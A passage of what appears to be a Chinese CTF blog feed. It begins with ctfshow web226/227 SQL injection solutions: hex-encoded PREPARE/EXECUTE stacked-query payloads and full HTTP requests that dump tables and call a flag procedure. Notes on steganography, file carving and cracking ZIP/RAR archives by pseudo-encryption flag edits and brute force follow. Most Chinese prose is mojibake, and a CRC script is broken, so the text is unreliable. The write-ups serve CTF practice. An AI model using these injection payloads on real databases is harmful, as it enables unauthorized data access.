class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># show tables</span><br><span class="line">?username=&#x27;;Prepare stmt from 0x73686F77207461626C6573;EXECUTE stmt;</span><br><span class="line"># select * from ctfsh_ow_flagas</span><br><span class="line">?username=&#x27;;Prepare stmt from 0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173;EXECUTE stmt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/?username=&#x27;;Prepare%20stmt%20from%200x73686F77207461626C6573;EXECUTE%20stmt;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>619df01f-e0e2-42a2-b232-83a229284b6a.challenge.ctf.show</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://619df01f-e0e2-42a2-b232-83a229284b6a.challenge.ctf.show/other.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=b304b12mf4j5sdmt8lu0tjndgb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/?username=&#x27;;Prepare%20stmt%20from%200x73656C656374202A2066726F6D2063746673685F6F775F666C61676173;EXECUTE%20stmt;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>619df01f-e0e2-42a2-b232-83a229284b6a.challenge.ctf.show</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://619df01f-e0e2-42a2-b232-83a229284b6a.challenge.ctf.show/other.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=b304b12mf4j5sdmt8lu0tjndgb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web227">web227</span></h4><p><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">å­˜å‚¨è¿‡ç¨‹</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># SELECT * FROM information_schema.Routines</span><br><span class="line">&#x27;;prepare h from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;execute h;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/?username=&#x27;;prepare%20h%20from%200x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;execute%20h;--+%0A#%20SELECT%20*%20FROM%20information_schema.Routines%0A&#x27;;%20call%20getFlag();--+</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b06a0c07-d74f-4aa5-b2f9-ef4285bf3684.challenge.ctf.show</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://b06a0c07-d74f-4aa5-b2f9-ef4285bf3684.challenge.ctf.show/other.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=td89dg6cvb1nneqmfi4ktvgmna</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># select hex(&quot;select * from information_schema.routines&quot;)</span><br><span class="line">?username=&#x27;;Prepare stmt from 0x73656C656374202A2066726F6D20696E666F726D6174696F6E5F736368656D612E726F7574696E6573;EXECUTE stmt;%</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="æ„šäººèŠ‚æ¯">æ„šäººèŠ‚æ¯</span></h1><h2><span id="web">WEB</span></h2><h3><span id="easy_signin">easy_signin</span></h3><p>æŸ¥çœ‹æµè§ˆå™¨å‘ç°urlé“¾æ¥æ˜¯base64åŠ å¯†ã€‚<img src="https://img-blog.csdnimg.cn/img_convert/eea66e162a70efe45a115593662b2631.png" alt="image-20230404183149808"></p><p>base64è§£ç æ˜¯<code>face.png</code>ï¼Œå°è¯•<code>flag.txt</code>å’Œ<code>flag.php</code>ï¼Œbase64åŠ å¯†åä¼ å…¥éƒ½ä¸å¯¹ï¼Œç”¨<code>index.php</code>åŠ å¯†åä¼ å…¥ï¼Œçœ‹æºç ï¼Œç„¶åé€šè¿‡base64è§£å¯†ã€‚</p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/image-20230419181149917.png" alt="image-20230419181149917"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuoj</title>
      <link href="/2023/04/18/Buuoj/"/>
      <url>/2023/04/18/Buuoj/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#misc">MISC</a><ul><li><a href="#%E9%87%91%E4%B8%89%E8%83%96">é‡‘ä¸‰èƒ–</a></li><li><a href="#%E4%BA%8C%E7%BB%B4%E7%A0%81">äºŒç»´ç </a></li></ul></li></ul><!-- tocstop --><h1><span id="misc">MISC</span></h1><h2><span id="é‡‘ä¸‰èƒ–">é‡‘ä¸‰èƒ–</span></h2><ul><li><p>å·¥å…·ï¼šstegsolve</p></li><li><p>ä½¿ç”¨æ–¹æ³•ï¼šä½¿ç”¨ Analyseâ€“&gt; frame browseræŸ¥çœ‹</p></li></ul><h2><span id="äºŒç»´ç ">äºŒç»´ç </span></h2><ul><li>å·¥å…·ï¼šbinwalk</li><li>ä½¿ç”¨æ–¹æ³• <code>binwalk -e qr.png</code>åˆ†ç¦»å‡ºä¸¤å¼ å›¾</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf-bç«™ç¬”è®°</title>
      <link href="/2023/04/13/ctf-b%E7%AB%99%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/04/13/ctf-b%E7%AB%99%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#b%E7%AB%99%E7%BD%91%E5%AE%89%E8%AF%BE%E7%A8%8B">Bç«™ç½‘å®‰è¯¾ç¨‹</a></li><li><a href="#misc">Misc</a><ul><li><a href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B8%8E%E9%9A%90%E5%86%99">æ–‡ä»¶æ“ä½œä¸éšå†™</a><ul><li><a href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E8%AF%86%E5%88%AB">æ–‡ä»¶ç±»å‹è¯†åˆ«</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB%E6%93%8D%E4%BD%9C">æ–‡ä»¶åˆ†ç¦»æ“ä½œ</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%90%88%E5%B9%B6%E6%93%8D%E4%BD%9C">æ–‡ä»¶åˆå¹¶æ“ä½œ</a></li></ul></li><li><a href="#%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99">å›¾ç‰‡éšå†™</a><ul><li><a href="#%E5%9B%BE%E7%89%87%E5%8A%A0%E5%AF%86">å›¾ç‰‡åŠ å¯†</a></li></ul></li><li><a href="#%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">å‹ç¼©æ–‡ä»¶å¤„ç†</a><ul><li><a href="#%E5%88%A4%E6%96%AD%E4%BB%80%E4%B9%88%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F">åˆ¤æ–­ä»€ä¹ˆåŠ å¯†æ–¹å¼</a></li></ul></li><li><a href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">æµé‡åˆ†æ</a></li></ul></li><li><a href="#crypto">Crypto</a></li></ul><!-- tocstop --><h1><span id="bç«™ç½‘å®‰è¯¾ç¨‹">Bç«™ç½‘å®‰è¯¾ç¨‹</span></h1><p><a href="https://www.processon.com/view/link/62b1b2267d9c08073c671315">å­¦ä¹ è·¯çº¿å›¾</a></p><h1><span id="misc">Misc</span></h1><h2><span id="æ–‡ä»¶æ“ä½œä¸éšå†™">æ–‡ä»¶æ“ä½œä¸éšå†™</span></h2><h3><span id="æ–‡ä»¶ç±»å‹è¯†åˆ«">æ–‡ä»¶ç±»å‹è¯†åˆ«</span></h3><ol><li>fileå‘½ä»¤<ul><li>ä½¿ç”¨åœºæ™¯ï¼šä¸çŸ¥é“åç¼€ï¼Œæ— æ³•æ‰“å¼€æ–‡ä»¶</li></ul></li><li>winhex<ul><li>ä½¿ç”¨åœºæ™¯ï¼šwindowsä¸‹é€šè¿‡æ–‡ä»¶å¤´ä¿¡æ¯åˆ¤æ–­æ–‡ä»¶ç±»å‹</li></ul></li></ol><ul><li>é‡åˆ°é¢˜ç›®ç»™ä¸ª.pngæ–‡ä»¶ï¼Œä½†æ˜¯æ‰“ä¸å¼€ï¼Œé€šè¿‡<code>file</code>å‘½ä»¤è¯†åˆ«å‘ç°æ˜¯dataçš„æƒ…å†µï¼Œéœ€è¦ä¿®å¤ã€‚<ul><li>é€šè¿‡010 Editoråœ¨æ–‡ä»¶åŠ ä¸Šå¯¹åº”å¤´éƒ¨å°±è¡Œã€‚</li></ul></li></ul><ol start="3"><li><p>010 Editor</p><p>é‡åˆ°éƒ½æ˜¯16è¿›åˆ¶ç¼–ç çš„æ–‡æœ¬ï¼Œå¯ä»¥é€šè¿‡import hexå¯¼å…¥ã€‚</p></li></ol><h3><span id="æ–‡ä»¶åˆ†ç¦»æ“ä½œ">æ–‡ä»¶åˆ†ç¦»æ“ä½œ</span></h3><ol><li><p>Binwalkå·¥å…·</p><p>ç”¨æ³•ï¼š</p><p>åˆ†ææ–‡ä»¶: binwalk filename</p><p>åˆ†ç¦»æ–‡ä»¶: binwalk -e filename</p></li><li><p>formost</p><ul><li>å¦‚æœBinwalkæ²¡åŠæ³•åˆ†ç¦»ï¼Œå¯ä»¥ä½¿ç”¨å®ƒ</li></ul><p>ç”¨æ³•ï¼š</p><p>Foremost filename -o dir</p></li><li><p>dd</p><ul><li>å¦‚æœæ˜¯åˆ†å—çš„è¯ï¼Œå‰ä¸¤ä¸ªå·¥å…·éƒ½ä¸ç®¡ç”¨ï¼Œå°±ä½¿ç”¨å®ƒæŠŠã€‚</li></ul><p>ç”¨æ³•ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span> =<span class="number">1</span>.txt of=<span class="number">4</span>.txt bs=<span class="number">5</span> count=<span class="number">3</span> skip=<span class="number">1</span></span><br><span class="line"># inputfile outputfile blocksize </span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬ä¸çŸ¥é“æ–‡ä»¶åˆ†æˆå‡ å—åˆé€‚çš„è¯ï¼Œéœ€è¦å€ŸåŠ©binwalkåˆ†æ</p></li></ol><h3><span id="æ–‡ä»¶åˆå¹¶æ“ä½œ">æ–‡ä»¶åˆå¹¶æ“ä½œ</span></h3><ol><li><p>Linuxä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat a b c ... &gt; dist</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å®Œæ•´æ€§æ£€æŸ¥</span></span><br><span class="line">md5sum filename</span><br></pre></td></tr></table></figure></li><li><p>Windowsä¸‹</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> /B a+b+c dist</span><br><span class="line"># å¦‚æœå‰ç¼€ä¸€æ ·</span><br><span class="line"><span class="built_in">copy</span> /B prefix* dist</span><br><span class="line"># å®Œæ•´æ ¡éªŒ</span><br><span class="line">certutil -hashfile filename md5</span><br></pre></td></tr></table></figure></li></ol><h2><span id="å›¾ç‰‡éšå†™">å›¾ç‰‡éšå†™</span></h2><ol><li><p>ç»†å¾®é¢œè‰²åŒºåˆ«</p></li><li><p>GIFå›¾å¤šå¸§éšè—</p><ol><li>é¢œè‰²é€šé“éšè—</li><li>ä¸åŒå¸§å›¾ä¿¡æ¯éšè—</li><li>ä¸åŒå¸§å¯¹æ¯”éšå†™</li></ol></li><li><p>Exifä¿¡æ¯éšè—</p><p>é€šè¿‡å±æ€§å¯ä»¥çœ‹åˆ°ä¿¡æ¯</p></li><li><p>å›¾ç‰‡ä¿®å¤</p><ol><li>å›¾ç‰‡å¤´ä¿®å¤</li><li>å›¾ç‰‡å°¾ä¿®å¤</li><li>CRCæ ¡éªŒä¿®å¤</li><li>é•¿ã€å®½ã€é«˜ä¿®å¤</li></ol></li><li><p>æœ€ä½æœ‰æ•ˆä½LSBéšå†™</p></li><li><p>å›¾ç‰‡åŠ å¯†</p><ol><li>Stegdetect</li><li>outguess</li><li>Jphide</li><li>F5</li></ol></li></ol><ul><li><p><strong>Firework</strong>ï¼š</p><blockquote><p>ä½¿ç”¨010 Editoræ‰“å¼€æ–‡ä»¶æ—¶ä¼šçœ‹åˆ°æ–‡ä»¶å¤´åŒ…å«fireworkæ ‡è¯†ï¼Œé€šè¿‡fireworkå¯ä»¥æ‰¾åˆ°éšè—å›¾ç‰‡ã€‚</p></blockquote></li><li><p><strong>Stegsolve</strong>:</p><blockquote><p>ä¸¤å¼ å›¾ç‰‡ä¹‹é—´åšè¿ç®—<em>XOR&#x2F;SUB&#x2F;ADD</em></p><p>å¯ä»¥ç»„åˆçŒœæµ‹LSBï¼Œä½†æ˜¯æ¯æ¬¡éƒ½éœ€è¦æ‰‹åŠ¨ç‚¹å‡»</p></blockquote></li><li><p><strong>Zsteg</strong>:</p><blockquote><p>ç›´æ¥æ’åˆ—ç»„åˆæ‰€æœ‰LSBç»“æœ</p></blockquote></li><li><p><strong>wbstego4</strong>:</p><blockquote><p>å¯ä»¥è§£å¯†.bmp&#x2F;pdfæ–‡ä»¶ï¼Œéœ€è¦å…ˆè½¬bmp</p></blockquote></li><li><p><strong>pythonè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL.Image</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">  im = PIL.Image.<span class="built_in">open</span>(<span class="string">&#x27;01.bmp&#x27;</span>)</span><br><span class="line">  im2 = im.copy()</span><br><span class="line">  pix = im2.load()</span><br><span class="line">  wid,hei = im2.size</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>,wid):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">0</span>,hei):</span><br><span class="line">      <span class="keyword">if</span> pix[x,y]&amp;<span class="number">0x1</span> == <span class="number">0</span>:</span><br><span class="line">        pix[x,y]=<span class="number">0</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        pix[x,y]=<span class="number">255</span></span><br><span class="line"> im2.show()</span><br><span class="line"> <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li><li><p><strong>TweakPNG</strong>ï¼š</p><ul><li>â€‹CRCé”™è¯¯</li></ul><blockquote><p>å®ƒå¯ä»¥ä¿®æ”¹å’ŒæŸ¥çœ‹ä¸€äº›PNGå›¾åƒæ–‡ä»¶çš„å…ƒä¿¡æ¯å­˜å‚¨ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡è¯¥è½¯ä»¶ä¿®æ”¹ï¼Œæœç´¢è½¯ä»¶æç¤ºé”™è¯¯å€¼çš„crcå€¼æ›¿æ¢æˆæ­£ç¡®çš„å³å¯ã€‚</p></blockquote><ul><li>å›¾ç‰‡å®½é«˜é”™è¯¯</li></ul><blockquote><p>éœ€è¦é€šè¿‡CRCè®¡ç®—å‡ºæ­£ç¡®çš„å®½é«˜</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">crc_current = <span class="string">&#x27;0x08ec7edb&#x27;</span> <span class="comment"># ç›®å‰çš„å°±è¡Œï¼Œä¸æ˜¯æç¤ºçš„æ­£ç¡®çš„</span></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&#x27;xxx.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc == crc_current:</span><br><span class="line">      <span class="built_in">print</span>(i,j)</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">hex</span>(i),<span class="built_in">hex</span>(j))</span><br></pre></td></tr></table></figure></li></ul><h3><span id="å›¾ç‰‡åŠ å¯†">å›¾ç‰‡åŠ å¯†</span></h3><ul><li><p>Bftools</p><blockquote><p>åœ¨winä¸‹ç”¨äºå¯¹åŠ å¯†è¿‡çš„å›¾ç‰‡è¿›è¡Œè§£å¯†æ“ä½œ</p></blockquote></li><li><p>SilentEye</p><blockquote><p>å¯ä»¥å°†æ–‡å­—æ–‡ä»¶éšè—åˆ°å›¾ç‰‡ï¼Œæˆ–è€…å¯¹å›¾ç‰‡è¿›è¡Œè§£å¯†çš„å·¥å…·</p></blockquote></li><li><p>Stegdetect</p><blockquote><p>ä¸»è¦ç”¨äºæ£€æµ‹å›¾ç‰‡ä½¿ç”¨å“ªäº›éšå†™å·¥å…·éšè—ä¿¡æ¯</p></blockquote></li><li><p>Jphide</p><blockquote><p>åŸºäºæœ€ä½æœ‰æ•ˆä½LSBçš„å›¾åƒéšå†™ç®—æ³• </p></blockquote></li><li><p>Outguess</p><blockquote><p>å›¾åƒéšå†™ç®—æ³• </p></blockquote></li><li><p>F5</p><blockquote><p>å›¾åƒéšå†™ç®—æ³• </p></blockquote></li><li><p>CQR</p><blockquote><p>äºŒç»´ç å¤„ç†</p></blockquote></li></ul><p><strong>äºŒç»´ç å¤„ç†ï¼š</strong></p><ol><li>è¡¥å…¨ï¼Œå¯èƒ½äºŒç»´ç çš„æ–¹å—è¢«æŒ¡ä½äº†ï¼Œæˆ‘ä»¬éœ€è¦è®²èµ·è¡¥å…¨å³å¯</li><li>å–åï¼šä½¿ç”¨ç”»å›¾å·¥å…·çš„åè‰² åŠŸèƒ½<ul><li>å¦‚æœæ˜¯å½©è‰²å›¾ç‰‡å¯ä»¥ç”¨<strong>Stegsolve</strong>æŸ¥çœ‹é¢œè‰²é€šé“è¿›è¡Œæ‰«ç ï¼Œå¦‚æœè¿˜æ²¡åŠæ³•æ‰«å‡ºæ¥å¯ä»¥å…ˆåè‰²å†æ‰«ã€‚</li></ul></li></ol><h2><span id="å‹ç¼©æ–‡ä»¶å¤„ç†">å‹ç¼©æ–‡ä»¶å¤„ç†</span></h2><h3><span id="åˆ¤æ–­ä»€ä¹ˆåŠ å¯†æ–¹å¼">åˆ¤æ–­ä»€ä¹ˆåŠ å¯†æ–¹å¼</span></h3><p><strong>ä¼ªåŠ å¯†ï¼š</strong></p><blockquote><p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„<strong>å…¨å±€æ–¹å¼ä½æ ‡è®°</strong>åº”å½“ä¸º 00 00 ï¼ˆ50 4B 03 04 14 00 åï¼‰<br>ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„<strong>å…¨å±€æ–¹å¼ä½æ ‡è®°</strong>åº”å½“ä¸º 09 00  ï¼ˆ50 4B 01 02 14 00 åï¼‰</p></blockquote><p> <strong>çœŸåŠ å¯†ï¼š</strong></p><blockquote><p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„<strong>å…¨å±€æ–¹å¼ä½æ ‡è®°</strong>åº”å½“ä¸º09 00 ï¼ˆ50 4B 03 04 14 00 åï¼‰ </p><p>ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„<strong>å…¨å±€æ–¹å¼ä½æ ‡è®°</strong>åº”å½“ä¸º09 00 ï¼ˆ50 4B 01 02 14 00 åï¼‰ </p></blockquote><ol><li><p>ä¼ªåŠ å¯†</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> ä¼ªåŠ å¯†æ–‡ä»¶</p></li></ol><p><strong>æ“ä½œæ–¹æ³•ï¼š</strong>ä½¿ç”¨winhexæ‰“å¼€å‹ç¼©æ–‡ä»¶ï¼Œæ‰¾åˆ°æ–‡ä»¶å¤´ç¬¬ä¹ç¬¬åä¸ªå­—ç¬¦ï¼Œå°†å…¶ä¿®æ”¹ä¸º0000</p><p>   1.ä½¿ç”¨winhexæ‰“å¼€æ–‡ä»¶æœç´¢16è¿›åˆ¶504B0102ï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸ªåŠ å¯†æ–‡ä»¶çš„æ–‡ä»¶å¤´å­—æ®µã€‚</p><p>   <font color="orange"><strong>RARæ–‡ä»¶</strong></font>ç”±äºæœ‰å¤´éƒ¨æ ¡éªŒï¼Œä½¿ç”¨ä¼ªåŠ å¯†æ—¶æ‰“å¼€æ–‡ä»¶ä¼šå‡ºç°æŠ¥é”™ï¼Œä½¿ç”¨winhexä¿®æ”¹æ ‡å¿—ä½åå¦‚æŠ¥é”™æ¶ˆå¤±ç›®æ­£å¸¸è§£å‹ç¼©ï¼Œè¯´æ˜æ˜¯ä¼ªåŠ å¯†ã€‚ä½¿ç”¨winhexæ‰“å¼€RARæ–‡ä»¶ï¼Œæ‰¾åˆ°ç¬¬24ä¸ªå­—èŠ‚ï¼Œè¯¥å­—èŠ‚å°¾æ•°ä¸º4è¡¨ç¤ºåŠ å¯†ï¼Œ0è¡¨ç¤ºæ— åŠ å¯†ï¼Œå°†å°¾æ•°æ”¹ä¸º0å³å¯ç ´è§£ä¼ªåŠ å¯†</p><ol start="2"><li><p>æš´åŠ›ç ´è§£</p><p>é€šå¸¸æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ARCHPR.exeå·¥å…·æ¥ç ´è§£raræ–‡ä»¶ï¼Œç”¨Ziperelloæ¥ç ´è§£zip</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong>windowsä¸‹åŠ å¯†è¿‡çš„zipæ–‡ä»¶</p><ol><li><p>æ”»å‡»ç±»å‹é€‰æ‹©æš´åŠ›ç ´è§£ï¼Œåœ¨èŒƒå›´ä½ç½®æ ¹æ®æç¤ºé€‰æ‹©æš´åŠ›ç ´è§£èŒƒå›´é€‰é¡¹è®¾ç½®æš´åŠ›ç ´è§£åŒ…å«çš„ç±»å‹å¼€å§‹äºå’Œç»“æŸäºé€‰é¡¹å…·ä½“èŒƒå›´ï¼Œå¦‚æœæ²¡æœ‰å®šä¹‰åˆ™å…¨èŒƒå›´æš´åŠ›ç ´è§£ã€‚ç‚¹å‡»æ‰“å¼€é€‰æ‹©è¦ç ´è§£çš„æ–‡ä»¶ï¼Œç‚¹å‡»å¼€å§‹è¿›è¡Œç ´è§£ã€‚å»ºè®®ä½¿ç”¨1~9ä½çš„æ•°å­—å¯†ç ï¼Œä»¥åŠç³»ç»Ÿ è‡ªå¸¦çš„è‹±æ–‡å­—å…¸ä½œä¸ºå¯†ç å­—å…¸ã€‚</p></li><li><p>æ”»å‡»ç±»å‹é€‰æ‹©æ©ç å¯ä»¥è¿›è¡Œå¤æ‚çš„æš´åŠ›ç ´è§£æ¯”å¦‚çŸ¥é“å¯†ç å‰3ä½æ˜¯abcï¼Œå3ä½ä¸ºæ•°å­—ï¼Œåˆ™åœ¨æ”»å‡»ç±»å‹é€‰æ‹©æ©ç ï¼Œåœ¨æ©ç å¤„è¾“å…¥acb???ï¼Œæš´åŠ›èŒƒå›´é€‰é¡¹é€‰æ‹©æ‰€æœ‰æ•°å­—ï¼Œæ‰“å¼€è¦ç ´è§£çš„ç‚¹å‡»ï¼Œç‚¹å‡»ç ´è§£ã€‚æ­¤æ—¶?? ?çš„éƒ¨åˆ†ä¼šè¢«æˆ‘ä»¬é€‰æ‹©çš„æš´åŠ›ç ´è§£èŒƒå›´ä¸­çš„å­—ç¬¦ä»£æ›¿ã€‚</p></li><li><p>æœ‰æ—¶ä¸ä¸€å®šèƒ½ç ´è§£å‡ºæ–‡ä»¶å£ä»¤ï¼Œä½†æ˜¯èƒ½å¤Ÿæ‰¾åˆ°åŠ 